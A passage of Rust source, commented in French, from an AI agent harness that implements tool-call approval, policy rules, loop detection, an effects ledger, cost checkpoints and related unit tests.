    /// cite l'erreur réelle. La réponse est gardée dans la conversation.
    async fn answer_after_loop(
        &self,
        spec: &TurnSpec,
        conv: &dyn Conversation,
        report: String,
        tool: &str,
        last_result: Option<&str>,
    ) -> anyhow::Result<TurnOutcome> {
        let s = &self.services;
        let mut messages = conv.request_messages().await?;
        messages.push(ChatMessage::user(format!(
            "(Message du harnais, pas du propriétaire.) Tu as appelé `{tool}` en boucle avec \
             les mêmes arguments : les outils sont arrêtés pour ce tour. Réponds maintenant au \
             propriétaire, sans outil, en quelques lignes : ce que tu as essayé, l'erreur exacte \
             renvoyée par l'outil (cite-la telle quelle), et ce que tu as déjà obtenu s'il y a \
             quelque chose. Termine par une seule ligne `CHOIX : <suite 1> | <suite 2> | <suite \
             3>`, deux ou trois suites courtes qu'il pourra choisir d'un clic (par exemple \
             Chercher autrement, Je te précise le compte ou les dates, Laisser tomber)."
        )));
        let text = match self
            .call_model(spec, messages, &NullSink, None, Some(ToolChoice::None))
            .await?
        {
            Ok(r) => {
                let _ = s
                    .budget
                    .record(penelope_kernel::budget::UsageRecord {
                        session_id: Some(spec.session_id.clone()),
                        run_id: spec.run_id.clone(),
                        turn_id: spec.turn_id.clone(),
                        model: r.model.clone(),
                        provider: r.provider.clone(),
                        role: Some("chat".into()),
                        generation_id: (!r.id.is_empty()).then(|| r.id.clone()),
                        prompt: r.usage.prompt,
                        completion: r.usage.completion,
                        cached: r.usage.cached,
                        reasoning: r.usage.reasoning,
                        cost_usd: r.cost_usd,
                        estimated: r.cost_estimated,
                        ..Default::default()
                    })
                    .await;
                r.message.text()
            }
            Err(failure) => {
                tracing::warn!(error = %failure.message, "réponse après boucle impossible");
                String::new()
            }
        };
        let (mut answer, mut choices) = split_choices(&text);
        if answer.trim().is_empty() {
            answer = format!(
                "Je me suis arrêtée : j'appelais `{tool}` en boucle sans avancer.\n\nErreur \
                 renvoyée par l'outil : {}\n\nComment veux-tu continuer ?",
                last_result
                    .map(|r| r.chars().take(800).collect::<String>())
                    .unwrap_or_else(|| "aucun résultat exploitable".into())
            );
        }
        if choices.len() < 2 {
            choices = LOOP_DEFAULT_CHOICES.iter().map(|c| c.to_string()).collect();
        }
        conv.record(&ChatMessage::assistant(&answer), true).await?;
        Ok(TurnOutcome::LoopAborted {
            report,
            answer,
            choices,
        })
    }

    /// Résout les appels d'outils sans résultat à la fin du transcript.
    async fn resolve_pending(
        &self,
        spec: &TurnSpec,
        conv: &dyn Conversation,
        execute: &(dyn ToolExecutor + Send + Sync),
        sink: &dyn TurnSink,
        detector: &mut LoopDetector,
    ) -> anyhow::Result<Pending> {
        let s = &self.services;
        let cfg = s.config.config();
        let tail = conv.tail().await?;
        let pending = pending_calls(&tail);
        if pending.is_empty() {
            return Ok(Pending::Nothing);
        }
        let mut nudge = self.delegation_nudge(spec).await?;
        // Les résultats de ce groupe d'appels sont admis ensemble à la fin (issue #52).
        let mut recorded = 0usize;

        for call in pending {
            if spec.cancel.is_cancelled() {
                return Ok(Pending::Stop(TurnOutcome::Cancelled));
            }
            let info = execute.describe_call(&call.name, &call.arguments).await;

            // 1. Liste blanche de l'étape ou de la skill.
            if !penelope_tools::is_allowed(&call.name, &spec.allowed_tools) {
                self.record_result(
                    conv,
                    sink,
                    &call,
                    false,
                    format!("Refusé : `{}` n'est pas autorisé ici.", call.name),
                    false,
                )
                .await?;
                recorded += 1;
                continue;
            }

            // 2. Une décision a-t-elle déjà été prise pour cet appel précis ?
            let prior = s
                .approvals
                .find_for_call(&spec.session_id, &call.id)
                .await?;
            let decided = match &prior {
                Some(a) => match a.state {
                    ApprovalState::Pending => {
                        return Ok(Pending::Stop(TurnOutcome::AwaitingApproval {
                            approval_id: a.id.0.clone(),
                        }));
                    }
                    ApprovalState::Approved => Some(true),
                    _ => Some(false),
                },
                None => None,
            };

            match decided {
                Some(false) => {
                    let a = prior.as_ref().expect("décision sans demande");
                    let why = match a.state {
                        ApprovalState::Expired => "la demande a expiré sans réponse".to_string(),
                        _ => a
                            .reason
                            .clone()
                            .map(|r| format!("le propriétaire a refusé : {r}"))
                            .unwrap_or_else(|| "le propriétaire a refusé".to_string()),
                    };
                    self.record_result(
                        conv,
                        sink,
                        &call,
                        false,
                        format!("Non exécuté : {why}. Propose une autre approche ou demande."),
                        false,
                    )
                    .await?;
                    continue;
                }
                Some(true) => {
                    // Approuvé : on exécute, sans redemander.
                    let _ = detector.observe(&call.name, &call.arguments);
                }
                None => {
                    // 3. Détecteur de boucles.
                    match detector.observe(&call.name, &call.arguments) {
                        LoopVerdict::Ok => {}
                        LoopVerdict::Warn(m) => {
                            self.record_result(
                                conv,
                                sink,
                                &call,
                                false,
                                format!("[avertissement du harnais] {m}"),
                                false,
                            )
                            .await?;
                            continue;
                        }
                        LoopVerdict::Abort(m) => {
                            let report = format!("{m}\n\n{}", detector.report());
                            s.events
                                .append(
                                    EventDraft::new("turn.loop_aborted", json!({"report": report}))
                                        .session(&spec.session_id),
                                )
                                .await?;
                            tracing::warn!(session = %spec.session_id, %report, "boucle d'outil arrêtée");
                            // L'échec reste dans la conversation (issue #31) : le résultat réel,
                            // puis la note d'arrêt, pour que le tour suivant ne recommence pas.
                            let last =
                                last_result_of(&conv.tail().await?, &call.name, &call.arguments);
                            let body = match &last {
                                Some(r) => format!(
                                    "Dernier résultat réel de l'outil :\n{}",
                                    r.chars().take(1_500).collect::<String>()
                                ),
                                None => "Aucun résultat obtenu.".to_string(),
                            };
                            self.record_result(
                                conv,
                                sink,
                                &call,
                                false,
                                format!("{body}\n\n{LOOP_STOP_NOTE}"),
                                false,
                            )
                            .await?;
                            for rest in pending_calls(&conv.tail().await?) {
                                self.record_result(
                                    conv,
                                    sink,
                                    &rest,
                                    false,
                                    "Non exécuté : tour arrêté par le détecteur de boucles.".into(),
                                    false,
                                )
                                .await?;
                            }
                            return Ok(Pending::Loop {
                                report,
                                tool: info.effective_name.clone(),
                                last_result: last,
                            });
                        }
                    }

                    // 4. Politique et approbation.
                    let mut verdict = s
                        .policies
                        .evaluate(
                            &cfg.mcp.policy,
                            &info.effective_name,
                            server_of(&info.effective_name).as_deref(),
                            &call.arguments,
                            info.risk,
                            spec.run_id.as_deref(),
                            Some(&spec.session_id),
                        )
                        .await?;
                    // La déclaration du serveur MCP peut imposer sa politique à un outil :
                    // un refus l'emporte toujours, le reste cède à une règle du propriétaire.
                    if let Some(forced) = info.policy
                        && (forced == PolicyDecision::Deny || verdict.rule_id.is_none())
                    {
                        verdict.decision = forced;
                        verdict.reason = format!(
                            "politique de la déclaration du serveur : `{}`",
                            forced.as_str()
                        );
                    }
                    // Une règle « toujours » posée pour `config_set` vaut pour les réglages
                    // ordinaires, jamais pour le bac à sable, les providers ou Telegram.
                    if info.effective_name == "config_set"
                        && info.risk == RiskClass::Destructive
                        && verdict.decision != PolicyDecision::Deny
                    {
                        verdict.decision = PolicyDecision::AskTwice;
                        verdict.reason =
                            "réglage sensible : double confirmation à chaque fois".into();
                    }

                    match verdict.decision {
                        PolicyDecision::Deny => {
                            self.record_result(
                                conv,
                                sink,
                                &call,
                                false,
                                format!("Refusé par la politique : {}", verdict.reason),
                                false,
                            )
                            .await?;
                            continue;
                        }
                        PolicyDecision::Ask | PolicyDecision::AskTwice => {
                            let double = verdict.decision == PolicyDecision::AskTwice;
                            let arguments = penelope_observe::redact_json(&call.arguments);
                            let approval = s
                                .approvals
                                .create(
                                    ApprovalKind::ToolCall,
                                    &info.effective_name,
                                    info.risk,
                                    json!({
                                        "tool": info.effective_name,
                                        "arguments": arguments,
                                        "reason": verdict.reason,
                                        "double": double,
                                        "call_id": call.id,
                                        "turn_id": spec.turn_id,
                                    }),
                                    vec![
                                        "Autoriser".into(),
                                        "Pour cette session".into(),
                                        "Toujours".into(),
                                        "Refuser".into(),
                                    ],
                                    Some(&spec.session_id),
                                    spec.run_id.as_deref(),
                                    false,
                                )
                                .await?;
                            sink.emit(TurnEvent::Approval {
                                id: approval.id.0.clone(),
                                tool: info.effective_name.clone(),
                                risk: info.risk,
                                arguments,
                                reason: verdict.reason.clone(),
                                double,
                            });
                            return Ok(Pending::Stop(TurnOutcome::AwaitingApproval {
                                approval_id: approval.id.0,
                            }));
                        }
                        PolicyDecision::Auto => {}
                    }
                }
            }

            // 5. Ledger d'effets **avant** exécution.
            sink.emit(TurnEvent::ToolCall {
                name: call.name.clone(),
                args: penelope_observe::redact_json(&call.arguments),
            });
            let spec_effect = EffectSpec::new(
                effect_kind(&info.effective_name),
                info.effective_name.clone(),
                call.arguments.clone(),
            )
            .session(&spec.session_id)
            .step(&call.id)
            .idempotent(info.idempotent);
            let spec_effect = match &spec.run_id {
                Some(r) => spec_effect.run(r),
                None => spec_effect,
            };

            let outcome = match s.effects.plan(spec_effect).await? {
                // Rejoué depuis le ledger : **jamais** ré-exécuté.
                Planned::Replayed(v) => ToolOutcome::ok(v),
                Planned::NeedsDecision(id) => ToolOutcome {
                    value: json!({"effect": id.as_str(), "state": "unknown"}),
                    is_error: true,
                    text: format!(
                        "Cet appel a peut-être déjà eu lieu (effet {id}). Une décision du \
                         propriétaire est requise avant de relancer."
                    ),
                    eager: false,
                },
                Planned::InFlight(_) => ToolOutcome {
                    value: json!({"state": "in_flight"}),
                    is_error: true,
                    text: "Appel déjà en cours.".into(),
                    eager: false,
                },
                Planned::Fresh(id) => {
                    s.effects.dispatching(&id).await?;
                    let result = execute
                        .execute_cancellable(&call.name, &call.arguments, &spec.cancel)
                        .await;
                    match &result {
                        Ok(o) if !o.is_error => s.effects.complete(&id, o.value.clone()).await?,
                        Ok(o) => s.effects.fail(&id, o.text.clone()).await?,
                        Err(e) => s.effects.fail(&id, e.to_string()).await?,
                    }
                    match result {
                        Ok(o) => o,
                        Err(e) => ToolOutcome::error(&e),
                    }
                }
            };

            s.events
                .append(
                    EventDraft::new(
                        "tool.result",
                        json!({"tool": info.effective_name, "ok": !outcome.is_error}),
                    )
                    .session(&spec.session_id),
                )
                .await?;
            let mut text = outcome.text.clone();
            if let Some(n) = nudge.take() {
                text.push_str(&n);
            }
            self.record_result(conv, sink, &call, !outcome.is_error, text, outcome.eager)
                .await?;
            recorded += 1;
        }
        conv.admit_tool_results(recorded).await?;
        Ok(Pending::Resolved)
    }

    /// Plafond d'appels et point de contrôle de coût d'un tour, comptés sur tout le tour
    /// (reprises après approbation comprises) : `Some` arrête ou suspend le tour.
    async fn turn_limits(
        &self,
        spec: &TurnSpec,
        sink: &dyn TurnSink,
        iteration: u32,
        cost: f64,
    ) -> anyhow::Result<Option<TurnOutcome>> {
        let s = &self.services;
        let cfg = s.config.config();
        let Some(turn_id) = &spec.turn_id else {
            return Ok(None);
        };
        let (calls, turn_cost) = s.budget.turn_totals(turn_id).await?;
        if calls >= self.max_iterations as i64 {
            return Ok(Some(TurnOutcome::Failed {
                error: format!(
                    "le tour n'a pas convergé en {} appels au modèle (reprises après \
                     approbation comprises)",
                    self.max_iterations
                ),
            }));
        }
        let step = cfg.budget.turn_checkpoint_usd;
        // Un run de workflow a son propre plafond (`budget.run_usd`).
        if step <= 0.0 || spec.run_id.is_some() || turn_cost < step {
            return Ok(None);
        }
        let level = (turn_cost / step).floor() as i64;
        let call_id = format!("checkpoint:{turn_id}:{level}");
        let usd = crate::budget_alert::usd;
        let prior = s
            .approvals
            .find_for_call(&spec.session_id, &call_id)
            .await?;
        match prior.map(|a| (a.state, a.id.0)) {
            Some((ApprovalState::Approved, _)) => Ok(None),
            Some((ApprovalState::Pending, id)) => {
                Ok(Some(TurnOutcome::AwaitingApproval { approval_id: id }))
            }
            Some(_) => Ok(Some(TurnOutcome::Answered {
                text: format!(
                    "⏹ Tour arrêté à ta demande après {} ({calls} appels au modèle).",
                    usd(turn_cost)
                ),
                iterations: iteration,
                cost_usd: cost,
            })),
            None => {
                let reason = format!(
                    "Ce tour a coûté {} ({calls} appels au modèle), je continue ?",
                    usd(turn_cost)
                );
                let arguments = json!({"cost_usd": turn_cost, "calls": calls});
                let approval = s
                    .approvals
                    .create(
                        ApprovalKind::BudgetExceeded,
                        "tour",
                        RiskClass::Unknown,
                        json!({
                            "checkpoint": true,
                            "call_id": call_id,
                            "turn_id": turn_id,
                            "arguments": arguments,
                            "reason": reason,
                        }),
                        vec!["Continuer".into(), "Arrêter".into()],
                        Some(&spec.session_id),
                        None,
                        false,
                    )
                    .await?;
                sink.emit(TurnEvent::Approval {
                    id: approval.id.0.clone(),
                    tool: "tour".into(),
                    risk: RiskClass::Unknown,
                    arguments,
                    reason,
                    double: false,
                });
                Ok(Some(TurnOutcome::AwaitingApproval {
                    approval_id: approval.id.0,
                }))
            }
        }
    }

    /// Tous les `delegate_after_calls` appels au modèle d'un tour, le résultat d'outil
    /// suivant rappelle de regrouper les commandes ou de déléguer (issue #19).
    async fn delegation_nudge(&self, spec: &TurnSpec) -> anyhow::Result<Option<String>> {
        let s = &self.services;
        let every = s.config.config().budget.delegate_after_calls as i64;
        let Some(turn_id) = &spec.turn_id else {
            return Ok(None);
        };
        if every == 0 {
            return Ok(None);
        }
        let (calls, turn_cost) = s.budget.turn_totals(turn_id).await?;
        if calls == 0 || calls % every != 0 {
            return Ok(None);
        }
        Ok(Some(format!(
            "\n\n[Harnais : {calls} appels au modèle dans ce tour ({}), chacun renvoie tout le \
             contexte. Regroupe les commandes restantes dans un seul `shell_exec`, ou confie la \
             suite à `sub_agent_spawn`, qui ne rend que sa conclusion. Mets aussi à jour tes \
             notes de travail (`session_notes` : plan, décisions, prochaine étape).]",
            crate::budget_alert::usd(turn_cost)
        )))
    }

    async fn record_result(
        &self,
        conv: &dyn Conversation,
        sink: &dyn TurnSink,
        call: &ToolCall,
        ok: bool,
        text: String,
        eager: bool,
    ) -> anyhow::Result<()> {
        let preview: String = text.chars().take(200).collect();
        conv.record(&ChatMessage::tool_result(&call.id, &call.name, text), eager)
            .await?;
        sink.emit(TurnEvent::ToolResult {
            name: call.name.clone(),
            ok,
            preview,
        });
        Ok(())
    }

    /// Tranche une approbation et crée la règle éventuelle (§9.2). Ne relance pas le
    /// tour : c'est au canal de remettre un tour `resume` en file.
    pub async fn decide_approval(
        &self,
        approval_id: &str,
        decision: &Decision,
    ) -> anyhow::Result<bool> {
        decide_approval(&self.services, approval_id, decision).await
    }

    /// Ancien nom, conservé pour les appelants existants.
    pub async fn resume_after_approval(
        &self,
        approval_id: &str,
        decision: &Decision,
    ) -> anyhow::Result<bool> {
        self.decide_approval(approval_id, decision).await
    }
}

/// Motif d'arguments d'une règle « toujours », dérivé de l'appel : ce qui borne
/// l'autorisation à ce que le propriétaire a vraiment vu (issue #67). `None` : la règle
/// couvre l'outil (outils MCP, outils sans argument significatif).
pub(crate) fn arg_pattern(tool: &str, args: Option<&Value>) -> Option<Value> {
    use penelope_hitl::policy::{CMD_PREFIX_OP, ORIGIN_OP, PATH_PREFIX_OP};
    let args = args?;
    let str_of = |k: &str| args.get(k).and_then(|v| v.as_str()).map(String::from);
    let prefix = |k: &str, op: &str, v: String| Some(json!({k: {op: v}}));
    match tool {
        // Famille de commandes : `cargo test …`, `git log …`, `ls …`.
        "shell_exec" => {
            let command = str_of("command")?;
            let words: Vec<&str> = command.split_whitespace().collect();
            const TWO_WORDS: &[&str] = &[
                "cargo", "git", "npm", "pnpm", "yarn", "make", "docker", "kubectl", "brew",
                "python3", "uv",
            ];
            let head = match words.as_slice() {
                [first, second, ..] if TWO_WORDS.contains(first) => format!("{first} {second}"),
                [first, ..] => first.to_string(),
                [] => return None,
            };
            prefix("command", CMD_PREFIX_OP, head)
        }
        // Répertoire du fichier : un « toujours » sur `src/a.rs` vaut pour `src/`.
        "fs_write" | "fs_edit" => {
            let path = str_of("path")?;
            let dir = match path.rfind('/') {
                Some(i) => path[..=i].to_string(),
                None => String::new(),
            };
            prefix("path", PATH_PREFIX_OP, dir)
        }
        "git_push" => {
            let mut m = serde_json::Map::new();
            for k in ["remote", "branch"] {
                if let Some(v) = str_of(k) {
                    m.insert(k.into(), json!(v));
                }
            }
            (!m.is_empty()).then(|| Value::Object(m))
        }
        // Hôte visé, schéma compris.
        "http_fetch" => {
            let url = str_of("url")?;
            let host = url
                .split_once("://")
                .map(|(scheme, rest)| {
                    format!("{scheme}://{}", rest.split('/').next().unwrap_or_default())
                })
                .unwrap_or(url);
            prefix("url", ORIGIN_OP, host)
        }
        "config_set" => str_of("path").map(|p| json!({"path": p})),
        _ => None,
    }
}

/// Tranche une approbation : la première décision gagne, une fenêtre crée une règle.
pub async fn decide_approval(
    s: &Services,
    approval_id: &str,
    decision: &Decision,
) -> anyhow::Result<bool> {
    match s.approvals.decide(approval_id, decision).await {
        Ok(a) => {
            // « Toujours », « pour ce run », « pour cette session » : règle visible et
            // révocable dans `/policies`.
            let window_ref = match decision.window {
                PolicyWindow::Run => a.run_id.clone().or_else(|| a.session_id.clone()),
                PolicyWindow::Session => a.session_id.clone(),
                _ => None,
            };
            if decision.approved && decision.window != PolicyWindow::Once {
                let window = if decision.window == PolicyWindow::Run && a.run_id.is_none() {
                    PolicyWindow::Session
                } else {
                    decision.window
                };
                // Un « toujours » est borné au contexte de l'appel (famille de commandes,
                // répertoire, remote), pas à l'outil entier (issue #67).
                let pattern = arg_pattern(&a.subject, a.payload.get("arguments"));
                s.policies
                    .create_rule(
                        penelope_hitl::RuleScope::Tool,
                        Some(&a.subject),
                        server_of(&a.subject).as_deref(),
                        pattern,
                        PolicyDecision::Auto,
                        window,
                        window_ref.as_deref(),
                    )
                    .await?;
            } else if !decision.approved && decision.window.creates_rule() {
                s.policies
                    .create_rule(
                        penelope_hitl::RuleScope::Tool,
                        Some(&a.subject),
                        server_of(&a.subject).as_deref(),
                        None,
                        PolicyDecision::Deny,
                        decision.window,
                        None,
                    )
                    .await?;
            }
            s.events
                .append(EventDraft::new(
                    "approval.decided",
                    json!({
                        "id": approval_id,
                        "approved": decision.approved,
                        "via": decision.via,
                        "window": decision.window.as_str(),
                    }),
                ))
                .await?;
            Ok(decision.approved)
        }
        // Déjà tranché par l'autre canal : la première décision gagne.
        Err(penelope_hitl::HitlError::AlreadyDecided { .. }) => Ok(false),
        Err(e) => Err(e.into()),
    }
}

/// Appels du dernier message assistant qui n'ont pas encore de résultat.
///
/// Si un message utilisateur est arrivé depuis, les appels sont abandonnés : la
/// conversation a repris ailleurs, et ils ne doivent pas bloquer la nouvelle demande.
pub fn pending_calls(tail: &[ChatMessage]) -> Vec<ToolCall> {
    let Some(idx) = tail
        .iter()
        .rposition(|m| m.role == Role::Assistant && !m.tool_calls.is_empty())
    else {
        return Vec::new();
    };
    let after = &tail[idx + 1..];
    if after.iter().any(|m| m.role != Role::Tool) {
        return Vec::new();
    }
    let answered: BTreeSet<&str> = after
        .iter()
        .filter_map(|m| m.tool_call_id.as_deref())
        .collect();
    tail[idx]
        .tool_calls
        .iter()
        .filter(|c| !answered.contains(c.id.as_str()))
        .cloned()
        .collect()
}

/// Message d'erreur lisible pour le propriétaire.
/// Attente maximale honorée pour un `Retry-After`.
const RETRY_AFTER_MAX_SECS: u64 = 20;
/// Attente avant de relancer un flux coupé sans `Retry-After`.
const STREAM_RETRY_SECS: u64 = 2;

/// Attente avant la n-ième nouvelle tentative d'avant flux : 1 s, 2 s, 4 s… (issue #50).
fn retry_backoff_secs(done: u32) -> u64 {
    1u64 << done.min(4)
}

/// Dit combien de fois on a essayé et combien de temps on a attendu : un échec après
/// trois délais de connexion ne se lit pas comme un échec immédiat (issue #50).
fn with_attempts(mut failure: CallFailure, retries: u32, waited_secs: u64) -> CallFailure {
    if retries > 0 {
        failure.message = format!(
            "{}\n\n{} tentatives, {waited_secs} s d'attente entre elles.",
            failure.message,
            retries + 1
        );
    }
    failure
}

/// Dort `secs` secondes, sauf annulation. Vrai si l'attente est allée au bout.
async fn sleep_unless_cancelled(cancel: &CancelToken, secs: u64) -> bool {
    let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(secs);
    while tokio::time::Instant::now() < deadline {
        if cancel.is_cancelled() {
            return false;
        }
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
    }
    !cancel.is_cancelled()
}

/// Un modèle qui ne lit pas les images reçoit une mention à leur place : une photo
/// envoyée plus tôt ne doit pas faire échouer la conversation après un changement de
/// modèle ou un repli.
pub(crate) fn fit_modalities(
    messages: &[ChatMessage],
    catalog: &penelope_llm::catalog::Catalog,
    model_id: &str,
) -> Vec<ChatMessage> {
    let blind = catalog
        .get(penelope_llm::catalog::strip_provider(model_id))
        .map(|i| !i.accepts_images())
        .unwrap_or(false);
    let has_images = messages.iter().any(|m| {
        m.content
            .iter()
            .any(|c| matches!(c, Content::ImageUrl { .. }))
    });
    if !blind || !has_images {
        return messages.to_vec();
    }
    messages
        .iter()
        .map(|m| {
            let mut m = m.clone();
            m.content = m
                .content
                .into_iter()
                .map(|c| match c {
                    Content::ImageUrl { .. } => {
                        Content::text("[image non transmise : ce modèle ne lit pas les images]")
                    }
                    other => other,
                })
                .collect();
            m
        })
        .collect()
}

fn humanise_llm_error(e: &LlmError) -> String {
    let msg = &e.message;
    match e.kind {
        LlmErrorKind::Auth => format!(
            "le provider refuse la clé ou la demande ({msg}). Vérifier la clé : \
             `penelope secret set openrouter_api_key`"
        ),
        LlmErrorKind::UnknownModel => format!(
            "modèle inconnu du provider ({msg}). Changer de modèle : \
             `penelope model set main openrouter:<identifiant>`"
        ),
        LlmErrorKind::PaymentRequired => format!(
            "crédits OpenRouter épuisés ou plafond de la clé atteint ({msg}). \
             Recharger : https://openrouter.ai/settings/credits"
        ),
        LlmErrorKind::RateLimited => match e.retry_after {
            Some(s) => format!("limite de débit du provider ({msg}), réessayer dans {s} s"),
            None => format!("limite de débit du provider ({msg}), réessayer dans un instant"),
        },
        LlmErrorKind::ContentFilter => {
            format!("le provider a refusé la demande (filtre de contenu : {msg})")
        }
        LlmErrorKind::ContextLength => format!(
            "la conversation dépasse la fenêtre du modèle ({msg}). `/compact` résume les \
             anciens échanges, `/new` repart d'une session vide"
        ),
        LlmErrorKind::Transient => format!("provider indisponible pour l'instant ({msg})"),
        _ => e.to_string(),
    }
}

pub(crate) fn server_of(tool: &str) -> Option<String> {
    tool.strip_prefix("mcp__")
        .and_then(|rest| rest.split("__").next())
        .map(String::from)
}

pub(crate) fn effect_kind(tool: &str) -> EffectKind {
    if tool.starts_with("mcp__") {
        return EffectKind::Mcp;
    }
    match tool {
        "shell_exec" => EffectKind::Shell,
        "http_fetch" => EffectKind::Http,
        t if t.starts_with("git_") => EffectKind::Git,
        t if t.starts_with("fs_") => EffectKind::Fs,
        "send_message" | "send_file" => EffectKind::Telegram,
        _ => EffectKind::Tool,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use penelope_kernel::clock::TestClock;
    use penelope_llm::mock::{MockProvider, Scripted};
    use std::sync::atomic::{AtomicUsize, Ordering};

    struct CountingExecutor {
        calls: AtomicUsize,
        fail: bool,
    }

    #[async_trait::async_trait]
    impl ToolExecutor for CountingExecutor {
        async fn execute(
            &self,
            name: &str,
            _args: &Value,
        ) -> Result<ToolOutcome, penelope_tools::ToolError> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            if self.fail {
                return Err(penelope_tools::ToolError::Io("disque plein".into()));
            }
            Ok(ToolOutcome::ok(json!({"tool": name, "ok": true})))
        }
    }

    fn exec(fail: bool) -> CountingExecutor {
        CountingExecutor {
            calls: AtomicUsize::new(0),
            fail,
        }
    }

    async fn setup() -> (tempfile::TempDir, Arc<Services>, Arc<MockProvider>) {
        let dir = tempfile::tempdir().unwrap();
        let clock: penelope_kernel::clock::SharedClock = Arc::new(TestClock::default());
        let s = Arc::new(
            Services::for_tests(dir.path().to_path_buf(), clock)
                .await
                .unwrap(),
        );
        let p = Arc::new(MockProvider::new());
        (dir, s, p)
    }

    fn request(session_id: &str) -> TurnRequest {
        TurnRequest {
            session_id: session_id.to_string(),
            run_id: None,
            user_text: "corrige le bug".into(),
            model_id: "mock/model".into(),
            tools: vec![ToolDef::new("fs_read", "lire", json!({"type":"object"}))],
            system_prompt: "Tu es Pénélope.".into(),
            allowed_tools: vec![],
            cancel: CancelToken::new(),
        }
    }

    fn spec(session_id: &str) -> TurnSpec {
        TurnSpec {
            session_id: session_id.to_string(),
            run_id: None,
            turn_id: Some("t_test".into()),
            model_id: "mock/model".into(),
            fallback_models: vec![],
            tools: vec![ToolDef::new("fs_read", "lire", json!({"type":"object"}))],
            allowed_tools: vec![],
            cancel: CancelToken::new(),
        }
    }

    fn call(id: &str, name: &str, args: Value) -> ToolCall {
        ToolCall {
            id: id.into(),
            name: name.into(),
            arguments: args,
        }
    }

    async fn session(s: &Services) -> String {
        s.sessions
            .create(penelope_kernel::session::SessionKind::Chat, None)
            .await
            .unwrap()
            .id
            .to_string()
    }

    #[tokio::test]
    async fn a_plain_answer_finishes_in_one_iteration() {
        let (_d, s, p) = setup().await;
        p.reply("voici la réponse");
        let sid = session(&s).await;
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let e = exec(false);
        match loop_.run(request(&sid), &e).await.unwrap() {
            TurnOutcome::Answered {
                text, iterations, ..
            } => {
                assert_eq!(text, "voici la réponse");
                assert_eq!(iterations, 1);
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(e.calls.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn read_tools_run_without_approval() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "fs_read", json!({"path":"a.rs"}))],
        ));
        p.reply("j'ai lu le fichier");
        let sid = session(&s).await;
        let e = exec(false);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), 1);
    }

    /// §9 : un outil `write` suspend le tour et crée une demande d'approbation.
    #[tokio::test]
    async fn write_tools_suspend_the_turn_for_approval() {
        let (_d, s, p) = setup().await;
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"cargo build"}))],
        ));
        let sid = session(&s).await;
        let e = exec(false);
        let out = AgentLoop::new(s.clone(), p.clone())
            .run(request(&sid), &e)
            .await
            .unwrap();
        let id = match out {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        assert_eq!(
            e.calls.load(Ordering::SeqCst),
            0,
            "aucun effet avant approbation"
        );
        let pending = s.approvals.pending(10).await.unwrap();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].id.0, id);
        assert_eq!(pending[0].payload["call_id"], "c1");
    }

    /// §9.2 : après approbation, la reprise exécute l'appel **sans redemander**, puis
    /// rend la main au modèle.
    #[tokio::test]
    async fn an_approved_call_runs_on_resume_without_asking_again() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "compile");
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        let sink = RecordingSink::default();

        p.push(Scripted::ToolCalls(
            String::new(),
            vec![call("c1", "shell_exec", json!({"command":"cargo build"}))],
        ));
        let id = match loop_
            .run_conversation(&spec(&sid), &conv, &e, &sink)
            .await
            .unwrap()
        {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        assert!(
            sink.events()
                .iter()
                .any(|ev| matches!(ev, TurnEvent::Approval { double: false, .. }))
        );

        // Reprise avant décision : on attend toujours, sans créer de doublon.
        let again = loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap();
        assert_eq!(
            again,
            TurnOutcome::AwaitingApproval {
                approval_id: id.clone()
            }
        );
        assert_eq!(s.approvals.pending(10).await.unwrap().len(), 1);

        assert!(
            loop_
                .decide_approval(&id, &Decision::approve_once("telegram"))
                .await
                .unwrap()
        );
        p.reply("compilé");
        let out = loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), 1);

        // Le transcript est protocolairement complet : appel, résultat, réponse.
        let msgs = conv.messages();
        assert_eq!(msgs[1].tool_calls[0].id, "c1");
        assert_eq!(msgs[2].tool_call_id.as_deref(), Some("c1"));
        assert_eq!(msgs[3].text(), "compilé");
    }

    /// #75 : un tour paie un fsync par transition d'effet non idempotent, et aucun pour
    /// ses lectures.
    #[tokio::test]
    async fn only_non_idempotent_effects_pay_a_durable_commit() {
        let (_d, s, p) = setup().await;
        let sid = session(&s).await;
        let conv = MemoryConversation::new("Tu es Pénélope.", "compile");
        let e = exec(false);
        let loop_ = AgentLoop::new(s.clone(), p.clone());
        p.push(Scripted::ToolCalls(
            String::new(),
            vec![
                call("c1", "fs_read", json!({"path":"a.rs"})),
                call("c2", "fs_read", json!({"path":"b.rs"})),
                call("c3", "shell_exec", json!({"command":"cargo build"})),
            ],
        ));
        let id = match loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap()
        {
            TurnOutcome::AwaitingApproval { approval_id } => approval_id,
            other => panic!("{other:?}"),
        };
        assert_eq!(
            s.store.durable_commits(),
            0,
            "les lectures n'en paient aucun"
        );
        loop_
            .decide_approval(&id, &Decision::approve_once("telegram"))
            .await
            .unwrap();
        p.reply("compilé");
        let out = loop_
            .run_conversation(&spec(&sid), &conv, &e, &NullSink)
            .await
            .unwrap();
        assert!(matches!(out, TurnOutcome::Answered { .. }), "{out:?}");
        assert_eq!(e.calls.load(Ordering::SeqCst), 3);
        assert_eq!(
            s.store.durable_commits(),
            2,
            "dispatching et completed du seul effet non idempotent"
        );
